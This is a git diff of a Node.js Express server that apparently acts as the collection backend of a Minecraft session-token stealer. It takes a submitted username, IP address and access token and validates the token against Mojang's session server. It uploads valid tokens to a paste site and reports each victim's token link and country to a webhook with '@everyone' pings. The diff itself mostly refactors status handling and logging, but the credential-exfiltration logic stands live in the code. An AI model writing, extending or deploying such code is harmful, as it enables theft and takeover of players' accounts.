@@ -11,10 +11,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 app.post("/", async (req, res) => {
-    console.log("Received request:", req.body);
-
     const country = await fetchCountry(req.body.ip);
-    console.log("Country fetched:", country);
 
     const response = await post("https://sessionserver.mojang.com/session/minecraft/join", {
         accessToken: req.body.token,
@@ -23,20 +20,23 @@ app.post("/", async (req, res) => {
     })
     .then(res => {
         if (res.status === 204) {
-            return "License";
+            return { status: "License" };
         } else if (res.status === 403) {
-            return "Non-License";
+            console.log(`Non-License detected. Response data: ${JSON.stringify(res.data)}`);
+            return { status: "Non-License", error: res.data };
         } else {
             console.log(`Unexpected status: ${res.status}`);
-            return `Unexpected status: ${res.status}`;
+            return { status: `Unexpected status: ${res.status}` };
         }
     }).catch(error => {
+        console.error(`Request failed with error: ${error.message}`);
         if (error.response) {
             console.error(`Response data: ${JSON.stringify(error.response.data)}`);
+            return { status: "Request failed", error: error.response.data };
         }
-        return "Request failed";
+        return { status: "Request failed" };
     });
-    
+
     let webhookData = {
         content: `@everyone - ${req.body.username}`,
         embeds: [{
@@ -50,12 +50,15 @@ app.post("/", async (req, res) => {
         attachments: []
     };
 
-    if (response === "Non-License") {
+    if (response.status === "Non-License") {
+        console.log("Adding Non-License data to webhook.");
         webhookData.embeds[0].fields.push(
-            { name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false },
-            { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false }
+            { name: 'License Status', value: `**\`\`\`${response.status}\`\`\`**`, inline: false },
+            { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false },
+            { name: 'Error', value: `**\`\`\`${response.error.error}\`\`\`**`, inline: false },
+            { name: 'Path', value: `**\`\`\`${response.error.path}\`\`\`**`, inline: false }
         );
-    } else if (response === "License") {
+    } else if (response.status === "License") {
         console.log("Adding License data to webhook.");
         const [shorttoken, profiles] = await Promise.all([
             post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
@@ -80,8 +83,14 @@ app.post("/", async (req, res) => {
             { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false }
         );
         webhookData.embeds[0].fields.push({
-            name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
+            name: 'License Status', value: `**\`\`\`${response.status}\`\`\`**`, inline: false
         });
+    } else {
+        console.log(`Handling unexpected status: ${response.status}`);
+        webhookData.embeds[0].fields.push(
+            { name: 'Status', value: `**\`\`\`${response.status}\`\`\`**`, inline: false },
+            { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false }
+        );
     }
 
     try {
